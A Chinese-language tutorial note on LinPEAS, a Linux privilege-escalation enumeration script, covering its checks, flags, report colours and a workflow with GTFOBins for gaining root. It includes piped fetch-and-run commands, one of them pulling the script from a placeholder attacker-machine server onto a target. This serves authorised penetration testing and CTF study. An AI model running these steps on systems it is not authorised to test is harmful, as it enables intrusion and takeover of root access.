# linpeas.sh — Linux 提权自动枚举脚本

LinPEAS（Linux Privilege Escalation Awesome Script），PEASS-ng 套件的 Linux 组件。自动执行大量检查并输出彩色报告，只做**枚举**，不做利用：脚本只列出潜在提权点，需要人验证并手动利用。

- 仓库：https://github.com/peass-ng/PEASS-ng
- 纯 Bash、无依赖，下载即跑
- 定位：自动枚举 → 彩色报告 → 配合 [[GTFOBins]] 查表利用
- Windows 侧对应：winPEAS（配合 [[LOLBAS]]）

## 一、检查内容

| 检查项 | 具体内容 |
|---|---|
| 系统基础信息 | 内核版本、操作系统、已挂载的文件系统等 |
| 用户与权限 | 当前用户、sudo 权限配置、可登录用户列表 |
| 可提权命令 | 查找所有 SUID / SGID 文件，以及可通过 sudo 执行且不需要密码的命令并列出——这些可执行文件就是潜在的提权入口（GTFOBins 的用武之地） |
| 可写文件与目录 | 系统关键目录（如 /etc/、/home/）中当前用户有写权限的地方 |
| 定时任务（Cron jobs） | 是否存在由 root 运行且可被利用的定时任务 |
| 环境变量 | PATH 变量中是否存在可被劫持的路径 |
| 其他漏洞 | 尝试检测已知的内核漏洞或服务漏洞 |

## 二、下载与运行

目标机有外网，一行命令直接跑（不落地文件，内存中执行）：

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

下载到文件再运行：

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh          # 标准运行
sudo bash linpeas.sh  # 以 root 跑，检查更全面
```

目标机无外网，从攻击机传过去：

```
# 攻击机起 HTTP 服务
python3 -m http.server 8000

# 目标机拉取
curl http://攻击机IP:8000/linpeas.sh | bash
```

## 三、常用参数

| 参数 | 作用 |
|---|---|
| `-a` | Aggressive 模式，跑全部检查（含内核漏洞利用建议数据库） |
| `-q` | Quiet 模式，只输出关键发现 |
| `-s` | Superfast / 静默模式，跳过耗时检查 |
| `-P <密码>` | 提供密码，自动尝试 sudo 提示 |
| `-t <秒>` | 设置运行时间上限 |
| `-o <sections>` | 只运行指定的检查分类（如 `SysI,Container,Net`） |

## 四、报告怎么读（颜色含义）

| 颜色 | 含义 |
|---|---|
| 红底黄字 | 95% 以上把握的提权点，优先看 |
| 红色 | 高置信度发现，值得深入 |
| 黄色 | 有意思，需要人工核验 |
| 蓝 / 绿 | 信息类，低风险 |
| 亮青 / 品红 | 用户名、活跃用户 |

保存并提取高优先级发现：

```
./linpeas.sh -a 2>&1 | tee /tmp/linpeas_full.txt          # 实时看 + 保存
grep -aE $'\033\[1;31;103m' /tmp/linpeas_full.txt         # 提取红底黄字项
```

## 五、实战流程（配合 GTFOBins）

1. 把 linpeas.sh 传到目标机，运行并保存输出。
2. 看红底黄字 / 红色项，定位 SUID/SGID 文件、sudo 免密命令、可写路径等。
3. 把发现的可执行文件名逐个丢进 [[GTFOBins]] 查对应上下文（sudo / SUID / capabilities）的命令。
4. 按 GTFOBins 给的前提执行命令，`id` 验证是否拿到 root。

## 六、变体

| 变体 | 说明 |
|---|---|
| `linpeas.sh` | 默认版，含 Linux 漏洞利用建议器 |
| `linpeas_fat.sh` | 内置第三方工具，目标机无需外网 |
| `linpeas_small.sh` | 只做核心检查，体积最小 |

## 七、注意

- 脚本只枚举不利用，发现的结果需要人工验证并选择正确的利用方式。
- 仅在授权范围内使用（CTF、红队演练、渗透测试项目）。
